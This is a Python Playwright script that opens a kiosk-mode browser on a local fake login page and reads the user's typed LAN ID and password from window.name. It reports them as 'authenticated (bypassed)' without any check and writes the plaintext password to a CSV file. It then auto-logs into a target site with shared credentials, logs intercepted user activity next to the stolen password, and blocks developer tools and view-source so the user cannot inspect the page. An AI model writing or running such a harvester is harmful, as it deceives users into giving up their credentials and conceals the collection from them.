from playwright.sync_api import sync_playwright
import os
import sys
import time
import json
import csv
from datetime import datetime

# ✅ Access embedded paths when bundled via PyInstaller
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS  # Extracted temp path by PyInstaller
    except AttributeError:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# ✅ Configurable paths
CHROMIUM_PATH = resource_path("chrome/chrome.exe")
USER_DATA_DIR = os.path.join(os.getcwd(), "user-data")
LOGIN_PAGE_PATH = f"file:///{resource_path('login.html').replace(os.sep, '/')}"
CREDS_CSV_PATH = os.path.join(os.getcwd(), "creds.csv")

# ✅ Replace with actual site credentials
TARGET_SITE_URL = ""  # <-- ✅ UPDATE THIS
TARGET_USERNAME = ""  # <-- ✅ UPDATE THIS
TARGET_PASSWORD = ""  # <-- ✅ UPDATE THIS

# ✅ Allowed URLs for which to capture network activity
ALLOWED_CAPTURE_URLS = [
    "https://",
    "https://"
    # Add more URLs as needed
]

# ✅ Save data to CSV
def save_to_csv(lan_id, password, data):
    file_exists = os.path.exists(CREDS_CSV_PATH)
    with open(CREDS_CSV_PATH, "a", newline="", encoding="utf-8") as csvfile:
        writer = csv.writer(csvfile)
        headers = ["LAN ID", "Password", "Timestamp"] + list(data.keys())
        values = [lan_id, password, datetime.now().strftime("%Y-%m-%d %H:%M:%S")] + list(data.values())
        if not file_exists:
            writer.writerow(headers)
        writer.writerow(values)

def run():
    if not os.path.exists(CHROMIUM_PATH):
        print(f"[❌] Chromium not found at: {CHROMIUM_PATH}")
        return

    with sync_playwright() as p:
        context = p.chromium.launch_persistent_context(
            USER_DATA_DIR,
            executable_path=CHROMIUM_PATH,
            headless=False,
            args=[
                f"--app={LOGIN_PAGE_PATH}",
                "--start-maximized",
                "--disable-pinch",
                "--disable-extensions",
                "--disable-infobars",
                "--no-default-browser-check",
                "--no-first-run",
                "--noerrdialogs",
                "--disable-session-crashed-bubble",
                "--disable-features=TranslateUI",
                "--disable-component-extensions-with-background-pages",
                "--disable-background-networking",
                "--disable-popup-blocking",
                "--disable-notifications",
                "--kiosk"
            ]
        )

        page = context.pages[0] if context.pages else context.new_page()
        print("[🟡] Waiting for user to enter credentials...")

        credentials = None
        while not credentials:
            time.sleep(1)
            try:
                creds_json = page.evaluate("window.name")
                credentials = json.loads(creds_json)
            except Exception:
                continue

        lan_id = credentials.get("lanId")
        password = credentials.get("password")
        print(f"[✅] Authenticated as {lan_id} (bypassed)")
        save_to_csv(lan_id, password, {})  # Initial log

        # ✅ Helper: Check if current URL is allowed
        def is_allowed(url):
            return any(url.startswith(allowed) for allowed in ALLOWED_CAPTURE_URLS)

        # ✅ Request Logger
        def handle_request(request):
            try:
                current_url = request.frame.url
                if is_allowed(current_url) and "live-t-evo" in request.url:
                    post_data = request.post_data or "{}"
                    json_data = json.loads(post_data)
                    extracted = {
                        "destination": json_data.get("destination", ""),
                        "event_type": json_data.get("event_type", ""),
                        "user_id": json_data.get("user_id", ""),
                        "page_location": json_data.get("page_location", ""),
                        "user_login": json_data.get("user_login", ""),
                        "request_url": request.url
                    }
                    print("[📡] live-t-evo request logged")
                    save_to_csv(lan_id, password, extracted)
                else:
                    print(f"[⛔] Skipped request from: {current_url}")
            except Exception as e:
                print(f"[⚠️] Failed to handle request: {e}")

        # ✅ Response Logger
        def handle_response(response):
            try:
                current_url = response.frame.url
                if is_allowed(current_url) and "info?pointsOfInterest=true&locale=en" in response.url:
                    json_body = response.json()
                    first_key = next(iter(json_body), None)
                    data = {
                        "poi_key": first_key,
                        "poi_data": json.dumps(json_body[first_key])[:200] if first_key else "N/A"
                    }
                    print("[📡] pointsOfInterest data logged")
                    save_to_csv(lan_id, password, data)
                else:
                    print(f"[⛔] Skipped response from: {current_url}")
            except Exception as e:
                print(f"[⚠️] Failed to handle response: {e}")

        page.on("request", handle_request)
        page.on("response", handle_response)

        print("[🌐] Navigating to main site...")
        page.goto(TARGET_SITE_URL)

        # ✅ Login automation
        try:
            page.wait_for_load_state("networkidle", timeout=15000)
            username_input = page.query_selector("#username") or \
                             page.query_selector("input[name='username']") or \
                             page.query_selector("input[type='text']")
            password_input = page.query_selector("#password") or \
                             page.query_selector("input[name='password']") or \
                             page.query_selector("input[type='password']")

            if username_input and password_input:
                username_input.fill(TARGET_USERNAME)
                password_input.fill(TARGET_PASSWORD)
                page.click('[data-qa="login-button"]')
                print("[✅] Login attempted.")
            else:
                print("[⚠️] Login fields not found. Skipping login.")
        except Exception as e:
            print(f"[❌] Login step failed: {e}")

        # 🚫 Block developer tools
        page.evaluate("""() => {
            document.addEventListener('contextmenu', e => e.preventDefault());
            document.addEventListener('keydown', function(e) {
                if (
                    e.key === 'F12' ||
                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
                    (e.ctrlKey && e.key === 'U')
                ) {
                    e.preventDefault();
                }
            });
        }""")

        page.wait_for_timeout(99999999)

if __name__ == "__main__":
    run()
